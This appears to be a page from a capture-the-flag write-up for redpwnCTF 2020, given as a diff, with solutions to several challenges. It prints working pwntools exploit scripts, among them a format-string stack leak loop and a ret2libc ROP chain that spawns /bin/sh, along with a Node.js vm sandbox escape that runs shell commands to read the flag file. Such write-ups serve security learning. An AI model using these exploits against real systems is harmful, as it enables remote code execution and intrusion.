+<span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;2020.redpwnc.tf&quot;</span><span class="p">,</span> <span class="mi">31908</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>flag : <code>flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}</code>  </p>
+
+<h1>secret-flag</h1>
+
+<blockquote>
+  <p>There's a super secret flag in printf that allows you to LEAK the data at an address?? <br />
+  nc 2020.redpwnc.tf 31826 <br />
+  if you look at the program on your dissasembler, you can see that our input become an argument on the printf function, however the program didn't call the printf properly, so we can input the string format <code>%s</code> and it will print a string somewhere from the stack, to control it simply do <code>%n$s</code> and it will print a random nth string somewhere from the stack.  </p>
+</blockquote>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">while</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+    <span class="c1"># print(i)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;$s&quot;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;2020.redpwnc.tf&quot;</span><span class="p">,</span> <span class="mi">31826</span><span class="p">)</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;adventurer?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;$s&quot;</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+</code></pre></div>
+
+<p>flag : <code>flag{n0t_s0_s3cr3t_f1ag_n0w}</code></p>
+
+<h1>the-library</h1>
+
+<blockquote>
+  <p>There's not a lot of useful functions in the binary itself. I wonder where you can get some... <br />
+  nc 2020.redpwnc.tf 31350 <br />
+  This is a ret2libc challenge, I got the code and explanation <a target="_blank" href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/">here</a> <br />
+  So basically we want to pop the value /bin/sh into RDI, the call system, system will read what to execute from RDI, thus executes /bin/sh</p>
+</blockquote>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;2020.redpwnc.tf&quot;</span><span class="p">,</span> <span class="mi">31350</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./the-library&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;libc.so.6&quot;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">libc_start_main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;ret&#39;</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">pad</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="p">]</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">))</span> 
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>flag : <code>flag{jump_1nt0_th3_l1brary}</code></p>
+
+<h1>uglybash</h1>
+
+<blockquote>
+  <p>This bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments. <br />
+  The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes? <br />
+  Enjoy the intro misc chal.  </p>
+</blockquote>
+
+<p>My way on solving this challenge is by changing the <code>eval</code> command (was <code>e$'\u0076'al</code>) into <code>printf '%s\n</code>, then run it, and from the output, change the <code>/bin/bash</code> command (was <code>$BASH ${*%%Y#0C}   ${*,,} &lt;&lt;&lt;</code>) into <code>printf '%s\n'</code> and run it. <br />
+flag : <code>flag{us3_zsh,_dummy}</code></p>
+
+<h1>CaaSiNO</h1>
+
+<blockquote>
+  <p>This is a vm jail challenge written in <strong>javascript</strong> <br />
+  It utilizing this vm thing in javascript to create a child process and run every input in a new context so that we could'nt touch the parent context and read the flag  </p>
+</blockquote>
+
+<p>However there's a flaw in vm javascript that we can use to abuse the system and touch the parent context to be able to read the flag (more on this <a target="_blank" href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">here</a>)</p>
+
+<p>and then i use this script to read the flag</p>
+
+<div class="codehilite"><pre><span></span><code><span class="k">this</span>
+    <span class="p">.</span><span class="nx">constructor</span>
+    <span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return this.process&#39;</span><span class="p">)()</span>
+    <span class="p">.</span><span class="nx">mainModule</span>
+    <span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">&#39;cat /ctf/flag.txt&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
+</code></pre></div>
+
+<p><code>flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}</code></p>
+
+</div>
+    </div>
+</body>
+<script>
+    $(".menu-button").hover(function(){
+        $(this).addClass("hovered");
+    }, function(){
+        $(this).removeClass("hovered");
+    });
+
+    window.setInterval(anim, 2500);
+
+    function anim() {
+        var menus = ["aboutus", "notes", "writeup", "contact", "news"]
+
+        lastPath = window.location.pathname.split("/").pop().split(".html")[0]
+        menus = menus.filter(item => item !== lastPath)
+
+        if (!hoveredExist()) {
+            menu = menus[Math.floor(Math.random() * menus.length)]
+            for (let i = 0; i < 5; i++) {
+                blink(i, menu)  
+            }
+        }
+    }
+
+    function blink(i, menu) { 
+        setTimeout(function() { 
+            $("." + menu)
+                .parent()
+                .addClass("hovered")
+            setTimeout(function () {
+                $("." + menu)
+                    .parent()
+                    .removeClass("hovered")
+            }, 50);
+        }, 100 * i); 
+    } 
+
+    function hoveredExist() {
+        var menus = ["aboutus", "notes", "writeup", "contact", "news"]
+        for (let index = 0; index < menus.length; index++) {
+            const menu = menus[index];
+            if ($("." + menu)
+                    .parent()
+                    .hasClass("hovered")) {
+                return true
+            }   
+        }
+        return false
+    }
+</script>
+</html>
